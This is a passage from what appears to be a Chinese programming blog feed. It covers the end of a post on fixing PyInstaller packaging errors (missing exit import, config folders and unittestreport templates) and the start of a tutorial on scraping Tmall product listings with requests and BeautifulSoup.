class="title">main</span></span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="问题究因">3.1.2. 问题究因</h3>
<ol type="1">
<li>通过上面的异常信息可得知，<code>get_config.py</code> 脚本中的第 21 行，<code>exit</code> 未被识别为系统关键字，从而导致报错。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> common.get_root_path <span class="keyword">import</span> get_root_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        file = os.path.join(get_root_path(), <span class="string">'config'</span>, <span class="string">'config.yml'</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.config = yaml.safe_load(f.read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"The <span class="subst">{file}</span> file is not exist, please check again."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="问题排除">3.1.3. 问题排除</h3>
<ol type="1">
<li>基于以上原因，想要系统自动识别 <code>exit</code>，就需要导入 sys 模块中的 exit 方法。</li>
<li>所以，在代码头部加入如下一行，即可解决问题。 <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="配置文件不存在">3.2. 配置文件不存在</h2>
<h3 id="问题浮现-1">3.2.1. 问题浮现</h3>
<ol type="1">
<li>第二次使用如下命令打包，加入了 <code>-n</code> 参数，用以指定输出程序的文件名。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">pyinstaller -D -c -n satePlanCheckTools main.py</span><br></pre></td></tr></tbody></table></figure></li>
<li>运行程序，这回报了一个配置文件不存在的错误，错误信息如下（这个报错信息是自己在工具中加入的异常处理代码，所以没有代码及行数等具体的信息）。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">boyce</span>\<span class="title">Desktop</span>\<span class="title">dist</span>\<span class="title">satePlanCheckTools</span>&gt;<span class="title">satePlanCheckTools.exe</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">boyce</span>\<span class="title">Desktop</span>\<span class="title">dist</span>\<span class="title">satePlanCheckTools</span>\<span class="title">config</span>\<span class="title">config.yml</span> <span class="title">file</span> <span class="title">is</span> <span class="title">not</span> <span class="title">exist</span>, <span class="title">please</span> <span class="title">check</span> <span class="title">again</span>.</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="问题究因-1">3.2.2. 问题究因</h3>
<ol type="1">
<li>进入到 dist 打包目录中，发现源项目中的 <code>config</code>、<code>testData</code>、<code>testResult</code> 这三个文件夹均不存在，个人想法可能是由于这三个文件夹包含的是 <code>yml</code> 配置文件，<code>pyinstaller</code> 自动忽略了非 <code>py</code> 文件，进而导致了小工具的频繁报错。
<img src="/p/289e731e/源代码目录和打包后目录对比.webp" alt="源代码目录和打包后目录对比"></li>
</ol>
<h3 id="问题排除-1">3.2.3. 问题排除</h3>
<ol type="1">
<li>既然 <code>pyinstaller</code> 在打包时，无法自动将非 <code>py</code> 文件一起打包，那么就只能通过手动配置打包时的 <code>satePlanCheckTools.spec</code> 配置文件，将以上三个文件夹包含进来。</li>
<li>第一行的 <code>SETUP_DIR</code>，定义了源代码的绝对路径。</li>
<li>在第五行的 <code>datas</code> 部分，按照元组 <code>(源文件夹路径, 目标路径)</code> 的形式，将三个文件夹填入其中，其意义是把<code>源文件夹路径</code>同时打包至 <code>dist</code> 的<code>目标路径</code>目录下。</li>
<li>修改后的配置文件 <code>Analysis</code> 部分如下所示。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">SETUP_DIR = <span class="string">'E:\\temp\\unit-test-demo\\'</span></span><br><span class="line">a = Analysis([<span class="string">'main.py'</span>],</span><br><span class="line">             pathex=[<span class="string">'E:\\temp\\unit-test-demo'</span>],</span><br><span class="line">             binaries=[],</span><br><span class="line">             datas=[(SETUP_DIR + <span class="string">'config'</span>, <span class="string">'config'</span>), (SETUP_DIR + <span class="string">'testData'</span>, <span class="string">'testData'</span>), (SETUP_DIR + <span class="string">'testResult'</span>, <span class="string">'testResult'</span>],</span><br><span class="line">             hiddenimports=[],</span><br><span class="line">             hookspath=[],</span><br><span class="line">             runtime_hooks=[],</span><br><span class="line">             excludes=[],</span><br><span class="line">             win_no_prefer_redirects=<span class="literal">False</span>,</span><br><span class="line">             win_private_assemblies=<span class="literal">False</span>,</span><br><span class="line">             cipher=block_cipher,</span><br><span class="line">             noarchive=<span class="literal">False</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li>类似地，如果项目中包含其他的静态资源，例如图片、视频等，也需要将这些目录手动加入 <code>datas</code> 中。</li>
</ol>
<h2 id="templates.html不存在">3.3.
<code>templates.html</code> 不存在</h2>
<h3 id="问题浮现-2">3.3.1. 问题浮现</h3>
<ol type="1">
<li>因为以上修改了打包时的配置文件，所以在后续的打包操作中，直接指定配置文件进行打包就可以了。命令如下。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">pyinstaller satePlanCheckTools.spec</span><br></pre></td></tr></tbody></table></figure></li>
<li>打包后，第三次运行工具，发现还是报错了，报错信息如下。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">boyce</span>\<span class="title">Desktop</span>\<span class="title">dist</span>\<span class="title">satePlanCheckTools</span>&gt;<span class="title">satePlanCheckTools.exe</span></span></span><br><span class="line"><span class="function"><span class="title">user_login_succ_01</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【失败】</span></span><br><span class="line"><span class="function"><span class="title">user_login_failed_02</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【失败】</span></span><br><span class="line"><span class="function"><span class="title">user_login_failed_03</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【失败】</span></span><br><span class="line"><span class="function"><span class="title">user_login_failed_04</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【失败】</span></span><br><span class="line"><span class="function"><span class="title">user_login_failed_05</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【失败】</span></span><br><span class="line"><span class="function"><span class="title">user_login_failed_06</span> (<span class="title">testCase.login_101.login_case.UserLoginCase</span>)执行——&gt;【错误<span class="title">Error</span>】</span></span><br><span class="line"><span class="function">所有用例执行完毕，正在生成测试报告中......</span></span><br><span class="line"><span class="function"><span class="title">Traceback</span> (<span class="title">most</span> <span class="title">recent</span> <span class="title">call</span> <span class="title">last</span>):</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">main.py</span>", <span class="title">line</span> 28, <span class="title">in</span> &lt;<span class="title">module</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">unittestreport</span>\<span class="title">core</span>\<span class="title">testRunner.py</span>", <span class="title">line</span> 152, <span class="title">in</span> <span class="title">run</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">unittestreport</span>\<span class="title">core</span>\<span class="title">testRunner.py</span>", <span class="title">line</span> 116, <span class="title">in</span> <span class="title">__get_reports</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">jinja2</span>\<span class="title">environment.py</span>", <span class="title">line</span> 830, <span class="title">in</span> <span class="title">get_template</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">jinja2</span>\<span class="title">environment.py</span>", <span class="title">line</span> 804, <span class="title">in</span> <span class="title">_load_template</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">jinja2</span>\<span class="title">loaders.py</span>", <span class="title">line</span> 113, <span class="title">in</span> <span class="title">load</span></span></span><br><span class="line"><span class="function">  <span class="title">File</span> "<span class="title">jinja2</span>\<span class="title">loaders.py</span>", <span class="title">line</span> 187, <span class="title">in</span> <span class="title">get_source</span></span></span><br><span class="line"><span class="function"><span class="title">jinja2.exceptions.TemplateNotFound</span>: <span class="title">templates.html</span></span></span><br><span class="line"><span class="function">[13436] <span class="title">Failed</span> <span class="title">to</span> <span class="title">execute</span> <span class="title">script</span> <span class="title">main</span></span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="问题究因-2">3.3.2. 问题究因</h3>
<ol type="1">
<li>通过分析报错信息，发现是没有找到模板文件，而这个模板文件是来自于第三方库 <code>unittestreport</code> 的。</li>
<li>再往上阅读报错信息，发现原来是 <code>unittestreport\core\testRunner.py</code> 调用的模板文件，查看了下 <code>unittestreport</code> 库的在虚拟环境中的层级关系，<code>unittestreport\templates\</code> 目录应该是直接存放在 <code>dist</code> 目录下的。
<img src="/p/289e731e/unittestreport库层级关系.webp" alt="unittestreport库层级关系"></li>
<li>最后结合上面的第二个问题，可能仍然是由于 <code>unittestreport\templates\</code> 目录下都是非 <code>py</code> 文件，所以在打包过程中又被自动忽略了。</li>
<li>因此，可尝试修改配置文件 <code>satePlanCheckTools.spec</code>，手动加入 <code>unittestreport\templates\</code> 目录，验证是否解决问题。</li>
</ol>
<h3 id="问题排除-2">3.3.3. 问题排除</h3>
<ol type="1">
<li><p>通过 <code>pip install unittestreport</code> 命令，确定 <code>unittestreport</code> 模块存放的位置，发现其中包含一个 <code>templates</code> 文件夹，存放的则是生成测试报告用的静态模板页面文件。</p></li>
<li><p>在 <code>data</code> 中再添加 unittestreport 模块中的模板文件夹路径。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">(SETUP_DIR + <span class="string">'.venv\\Lib\\site-packages\\unittestreport\\templates'</span>, <span class="string">'unittestreport\\templates'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>最后，<code>Analysis</code> 部分的配置内容如下所示。
</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">SETUP_DIR = <span class="string">'E:\\temp\\unit-test-demo\\'</span></span><br><span class="line">a = Analysis([<span class="string">'main.py'</span>],</span><br><span class="line">             pathex=[<span class="string">'E:\\temp\\unit-test-demo'</span>],</span><br><span class="line">             binaries=[],</span><br><span class="line">             datas=[(SETUP_DIR + <span class="string">'config'</span>, <span class="string">'config'</span>), </span><br><span class="line">                    (SETUP_DIR + <span class="string">'testData'</span>, <span class="string">'testData'</span>), </span><br><span class="line">                    (SETUP_DIR + <span class="string">'testResult'</span>, <span class="string">'testResult'</span>), </span><br><span class="line">                    (SETUP_DIR + <span class="string">'.venv\\Lib\\site-packages\\unittestreport\\templates'</span>, <span class="string">'unittestreport\\templates'</span>)],</span><br><span class="line">             hiddenimports=[],</span><br><span class="line">             hookspath=[],</span><br><span class="line">             runtime_hooks=[],</span><br><span class="line">             excludes=[],</span><br><span class="line">             win_no_prefer_redirects=<span class="literal">False</span>,</span><br><span class="line">             win_private_assemblies=<span class="literal">False</span>,</span><br><span class="line">             cipher=block_cipher,</span><br><span class="line">             noarchive=<span class="literal">False</span>)</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="工具验证">4. 工具验证</h1>
<ol type="1">
<li>基于以上修改后的 <code>satePlanCheckTools.spec</code> 配置文件，使用 <code>pyinstaller satePlanCheckTools.spec</code> 命令，重新打包生成可执行文件。
<figure class="highlight bat"><table><tbody><tr><td class="code"><pre><span class="line">(.venv) E:\temp\unit-test-demo&gt;pyinstaller satePlanCheckTools.spec</span><br><span class="line"><span class="number">57</span> INFO: PyInstaller: <span class="number">4</span>.<span class="number">3</span></span><br><span class="line"><span class="number">57</span> INFO: Python: <span class="number">3</span>.<span class="number">8</span>.<span class="number">4</span></span><br><span class="line"><span class="number">57</span> INFO: Platform: Windows-<span class="number">10</span>-<span class="number">10</span>.<span class="number">0</span>.<span class="number">19041</span>-SP0</span><br><span class="line"><span class="number">59</span> INFO: UPX is <span class="keyword">not</span> available.</span><br><span class="line"><span class="number">60</span> INFO: Extending PYTHONPATH with paths</span><br><span class="line">['E:\\temp\\unit-test-demo', 'E:\\temp\\unit-test-demo']</span><br><span class="line"><span class="number">67</span> INFO: checking Analysis</span><br><span class="line"><span class="number">67</span> INFO: Building Analysis because Analysis-<span class="number">00</span>.toc is non existent</span><br><span class="line">......</span><br><span class="line"><span class="number">8352</span> INFO: Writing RT_ICON <span class="number">7</span> resource with <span class="number">1128</span> bytes</span><br><span class="line"><span class="number">8358</span> INFO: Appending archive to EXE E:\temp\unit-test-demo\build\satePlanCheckTools\satePlanCheckTools.exe</span><br><span class="line"><span class="number">8815</span> INFO: Building EXE from EXE-<span class="number">00</span>.toc completed successfully.</span><br><span class="line"><span class="number">8817</span> INFO: checking COLLECT</span><br><span class="line"><span class="number">8818</span> INFO: Building COLLECT because COLLECT-<span class="number">00</span>.toc is non existent</span><br><span class="line"><span class="number">8818</span> INFO: Building COLLECT COLLECT-<span class="number">00</span>.toc</span><br><span class="line"><span class="number">9222</span> INFO: Building COLLECT COLLECT-<span class="number">00</span>.toc completed successfully.</span><br></pre></td></tr></tbody></table></figure></li>
<li>进入 <code>dist</code> 文件夹，双击执行小工具后无报错，正常运行，与在 pycharm 中源码执行的结果一致，测试报告文件也已正常生成，问题完美解决。
<img src="/p/289e731e/工具最终运行效果.webp" alt="工具最终运行效果"> <img src="/p/289e731e/测试报告.webp" alt="测试报告"></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pyinstaller</tag>
        <tag>项目打包</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 requets 和 BeautifulSoup 模块解析获取网页信息</title>
    <url>/p/74b702a8.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  本篇博客，将以实际操作的方式，逐步讲解如何利用 Python 语言，自动发送网页请求，解析网页内容，爬取其中需要的文字、图片、链接等属性信息，最后输出到本地文件中。</p>
<span id="more"></span>
<hr>
<h1 id="环境准备">2. 环境准备</h1>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 19%">
<col style="width: 73%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td>Python</td>
<td>3.X 版本以上</td>
</tr>
<tr class="even">
<td> 2</td>
<td>IDE</td>
<td>Pycharm，Eclipse 等，根据个人习惯选择即可</td>
</tr>
<tr class="odd">
<td> 3</td>
<td>requests</td>
<td>Python 第三方库，可通过 <code>pip install requests</code> 命令安装</td>
</tr>
<tr class="even">
<td> 4</td>
<td>BeautifulSoup</td>
<td>Python 第三方库，可通过 <code>pip install BeautifulSoup4</code> 命令安装</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="代码实现">3. 代码实现</h1>
<h2 id="网页url分析">3.1. 网页 url 分析</h2>
<ol type="1">
<li>以天猫平台搜索关键词 iPhone12 为例，打开浏览器的开发者工具，切换到 Network 页签，访问天猫主页，输入关键词 <code>iPhone12</code> 后，其搜索结果页面以及页面 url 链接如下所示。
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://list.tmall.com/search_product.htm?q=iPhone12&amp;type=p&amp;vmarket=&amp;spm=875.7931836%2FB.a2227oh.d100&amp;from=mallfp..pc_1_searchbutton</span><br></pre></td></tr></tbody></table></figure> <img src="https://ae01.alicdn.com/kf/Ud586429a658b487fad75ac18004f7ac3M.jpg" alt="天猫搜索结果页面"></li>
<li>去掉冗余的参数后，地址栏的 URL 链接如下所示。 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://list.tmall.com/search_product.htm?q=iPhone12</span><br></pre></td></tr></tbody></table></figure></li>
<li>再次访问上述链接，并在开发者工具中找到这条请求，请求详情如下。 <img src="https://ae01.alicdn.com/kf/U7597cf4ba7f3483397b8bccd026a56056.jpg" alt="关键词搜索请求详情"></li>
<li>可以看出：
<ul>
<li>该 url 链接是以 <code>GET</code> 方法发送的请求。</li>
<li>url 地址最后和 Query String
Parameters 部分，都有 <code>q=iPhone12</code>，这是咱们的搜索关键词，也是 url 请求的入参，之后还想要获取其他商品的时候，只需替换这个值即可。</li>
</ul></li>
</ol>
<h2 id="网页内容分析">3.2. 网页内容分析</h2>
<ol type="1">
<li>首先，利用 requests 库中的 get 方法，以上述链接作为入参，发送 get 请求，验证下请求的状态以及返回内容。代码如下所示：
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">search_url = <span class="string">'https://list.tmall.com/search_product.htm?q=iPhone12'</span></span><br><span class="line">rsp = requests.get(search_url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"搜索请求的返回状态："</span>, rsp.status_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rsp.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li>第一个 print 函数打印结果如下。 &gt; 搜索请求的返回状态： 200</li>
<li> 第二个 print 函数打印结果如下，可以看出，这就已经获取到搜索页面的源码了（内容较多，只粘贴前面部分）。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"gbk"</span> /&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"spm-id"</span> <span class="attr">content</span>=<span class="string">"a220m.1000858"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">"iPhone12-Apple/苹果,品类齐全，欢迎选购！"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width"</span> /&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//g.alicdn.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//assets.alicdn.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//img.alicdn.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//smc.tmall.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//www.tmall.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//bar.tmall.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//pcookie.tmall.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//log.mmstat.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//ac.mmstat.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//ac.atpanel.com"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//amos.alicdn.com"</span>/&gt;</span>  <span class="tag">&lt;<span class="name">title</span>&gt;</span>iPhone12-Apple/苹果-天猫Tmall.com-理想生活上天猫<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"//img.alicdn.com/tfs/TB1XlF3RpXXXXc6XXXXXXXXXXXX-16-16.png"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">g_config</span> = <span class="variable language_">window</span>.<span class="property">g_config</span> || {};</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">devId</span> = <span class="string">"pc"</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">headerVersion</span> = <span class="string">'1.0.0'</span>;</span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">loadModulesLater</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">sl</span> = <span class="string">'vm'</span>;</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">(<span class="keyword">function</span>(<span class="params"></span>){<span class="keyword">var</span> a=[[<span class="string">'sysId'</span>,<span class="string">'list'</span>],[<span class="string">'appId'</span>,<span class="number">2003</span>],[<span class="string">'appName'</span>,<span class="string">'tmallsearch'</span>],[<span class="string">'pageType'</span>,<span class="string">'list'</span>],[<span class="string">'pageId'</span>,<span class="string">'list'</span>],[<span class="string">'version'</span>,<span class="string">'2.0'</span>],[<span class="string">'startTime'</span>,+<span class="keyword">new</span> <span class="title class_">Date</span>],[<span class="string">'ap_mods'</span>,{<span class="attr">poc</span>:[<span class="number">0.001</span>],<span class="attr">jstracker</span>:[<span class="number">0.001</span>]}]];<span class="variable language_">window</span>.<span class="property">g_config</span>=<span class="variable language_">window</span>.<span class="property">g_config</span>||{};<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,l=a.<span class="property">length</span>;i&lt;l;i++){<span class="variable language_">window</span>.<span class="property">g_config</span>[a[i][<span class="number">0</span>]]=a[i][<span class="number">1</span>]}})();<span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">ueId</span> = <span class="number">187</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">activity_rt</span>=<span class="string">'$psq.getIndustryTagsString()'</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">cat_rt</span>=<span class="string">'127110002'</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">u2iApi</span> = <span class="string">''</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">g_config</span>.<span class="property">ueUrl</span> = <span class="string">'//feedback.taobao.com/pc/feedbacks?productId=338&amp;source=Web'</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">_ap</span>=<span class="variable language_">window</span>.<span class="property">_ap</span>||[];_ap.<span class="title function_">push</span>([<span class="string">"_poc"</span>, <span class="string">"_trackCustom"</span>, <span class="string">"tpl"</span>, <span class="string">"sync"</span>]);<span class="variable language_">window</span>.<span class="property">onerror</span>=<span class="keyword">function</span>(<span class="params"></span>){_ap.<span class="title function_">push</span>([<span class="string">"jstracker"</span>,<span class="string">"_trackCustom"</span>,<span class="string">"msg="</span>+(<span class="variable language_">arguments</span>[<span class="number">0</span>]?<span class="built_in">encodeURIComponent</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]):<span class="string">""</span>)+<span class="string">"&amp;file="</span>+(<span class="variable language_">arguments</span>[<span class="number">1</span>]?<span class="built_in">encodeURIComponent</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]):<span class="string">""</span>)+<span class="string">"&amp;line="</span>+(<span class="variable language_">arguments</span>[<span class="number">2</span>]?<span class="built_in">encodeURIComponent</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>]):<span class="string">""</span>)])};</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>既然已经获取到搜索页面的源代码，接下来，分析下各个商品在网页中的位置和标签属性信息。回到浏览器，打开开发者工具，定位任意一个商品。
<ul>
<li>Windows 快捷键：<kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>C</kbd></li>
<li>macOS 快捷键：<kbd>Command</kbd>+<kbd>Shift</kbd>+<kbd>C</kbd></li>
</ul></li>
<li> 在 Elements 页签可看到，所有的商品都是在 id=J_ItemList 的 div 标签内，而每一个商品，也都是在单独的一个 div 标签内，data-id 即是该商品的 ID。
<img src="https://ae01.alicdn.com/kf/U940b18670d744a3da846fa75acee2ee5j.jpg" alt="商品元素详情"></li>
<li>再查看 class="product-iWrap" 的 div 标签，发现它包含了几个 div 子标签，根据 class 属性的名字可猜测出，这几个子标签，分别存放的是商品的图片链接、缩略图链接、商品价格、商品全称、商品状态（月成交和评价）等信息。</li>
</ol>
<h2 id="网页内容解析">3.3. 网页内容解析</h2>
<ol type="1">
<li>现在，咱们已经了解商品在网页源码中的元素位置了，在分析单个商品的各个属性如何获取之前，先介绍下如何解析网页。</li>
<li>在<a href="#3-2-网页内容分析">网页内容分析</a>章节第 1 步，咱们打印过 <code>rsp.text</code> 的值，但是由于此时 <code>rsp.text</code> 的属性是 str 类型，想提取其中部分内容，如果直接使用正则表达式，特容易匹配到多余的信息，显然是不合适的。</li>
<li>所以，BeautifulSoup 库的作用就来了，它可以直接对获取到的网页源码解析成 <code>bs4.BeautifulSoup</code> 对象，然后再通过 <code>find</code> 方法，把想要匹配的标签及属性作为入参，就可以找到所有满足入参条件的信息了。示例代码及作用说明如下。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 将网页源码解析成bs4.BeautifulSoup对象</span></span><br><span class="line">soup = BeautifulSoup(rsp.content, <span class="string">'lxml'</span>, from_encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找标签名是div，class属性是"product"的内容，即当前网页的所有商品列表</span></span><br><span class="line"><span class="comment"># attrs是字典类型，可以添加多个键值对</span></span><br><span class="line">product_list = soup.find_all(name=<span class="string">'div'</span>, attrs={<span class="string">"class"</span>: <span class="string">"product"</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可查看下获取的商品数量，是否跟页面展示的数量一致</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(product_list))</span><br><span class="line"><span class="comment"># Out: 60</span></span><br></pre></td></tr></tbody></table></figure></li>
<li>接下来，咱们就以结果中的第 4 个为例，正式开始获取该商品的属性信息了。product 变量存储的内容如下图所示。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 最终代码将会以for循环实现</span></span><br><span class="line">product = product_list[<span class="number">3</span>]</span><br></pre></td></tr></tbody></table></figure> <img src="https://ae01.alicdn.com/kf/U7ed1df79d5a248e7b970433befeaf4a0Y.jpg" alt="商品属性信息"></li>
</ol>
<h2 id="网页内容获取">3.4. 网页内容获取</h2>
<h3 id="获取商品图片">3.4.1. 获取商品图片</h3>
<ol type="1">
<li>展开 class=productImg-wrap 的 div 标签，图片的真实地址，存在于 img 标签的 src 属性中。
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"productImg-wrap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//detail.tmall.com/item.htm?id=629630915729<span class="symbol">&amp;amp;</span>skuId=4743517782890<span class="symbol">&amp;amp;</span>user_id=2616970884<span class="symbol">&amp;amp;</span>cat_id=2<span class="symbol">&amp;amp;</span>is_b=1<span class="symbol">&amp;amp;</span>rn=d80f020d60ae6865c1f843a6cf738a49"</span> <span class="attr">class</span>=<span class="string">"productImg"</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">data-p</span>=<span class="string">"4-10"</span> <span class="attr">atpanel</span>=<span class="string">"4-10,629630915729,1512,,spu,1,spu,2616970884,,,"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//img.alicdn.com/bao/uploaded/i4/2616970884/O1CN01iNHlOp1IOumm0hh7g_!!2616970884.jpg"</span>&gt;</span></span><br><span 